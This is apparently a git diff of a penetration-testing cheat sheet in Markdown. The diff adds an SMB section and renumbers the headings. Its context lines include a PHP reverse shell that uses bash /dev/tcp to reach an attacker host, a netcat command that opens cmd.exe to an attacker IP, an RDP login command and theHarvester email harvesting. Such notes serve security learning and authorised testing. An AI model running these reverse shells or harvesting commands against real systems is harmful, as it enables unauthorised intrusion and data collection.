@@ -14,12 +14,13 @@
 - [9.FTP](#ftp)
 - [10. Password Cracking](/hash_cracking.md)
 - [11. RDP-3389](#rdp)
-- [12. Metasploit](/metasploit.md)
-- [13. netcat](#nc)
-- [14. Reverse_Shell_Script](https://revshells.com)
-- [15. Privilege escalation](/Privilege.md)
-- [16 Email Harversting with theHarvester](#email)
-- [17. Simple Local Web Servers](#localweb)
+- [12. SMB](/smb.md)
+- [13. Metasploit](/metasploit.md)
+- [14. netcat](#nc)
+- [15. Reverse_Shell_Script](https://revshells.com)
+- [16. Privilege escalation](/Privilege.md)
+- [17. Email Harversting with theHarvester](#email)
+- [18. Simple Local Web Servers](#localweb)
 
 
 
@@ -162,14 +163,16 @@ exploit
 - __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__
 
 
-
-
-# [12. Metasploit](/metasploit.md)
-
+# [12. SMB](/smb.md)
 
 
 
-# 13. netcat <a name="nc"></a>
+# [13. Metasploit](/metasploit.md)
+
+
+
+
+# 14. netcat <a name="nc"></a>
 ```php
 <?php
  exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
@@ -190,20 +193,20 @@ __Download the reverse shell in windows__
     - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
 
 
-# [14. Reverse_Shell_Script](https://revshells.com)
+# [15. Reverse_Shell_Script](https://revshells.com)
 
 
 
-# [15. Privilege escalation](/Privilege.md)
+# [16. Privilege escalation](/Privilege.md)
 
 
 
-# 16 Email Harversting with theHarvester <a name="email"></a>
+# 17. Email Harversting with theHarvester <a name="email"></a>
 - __`theHarvester -d <domain name> -b google,linkedin,yahoo,dnsdumpster,duckduckgo,crtsh,rapdiddns`__
 
 
 
-# 17. Simple Local Web Servers <a name="localweb"></a>
+# 18. Simple Local Web Servers <a name="localweb"></a>
 
 ```
 python -m SimpleHTTPServer 80
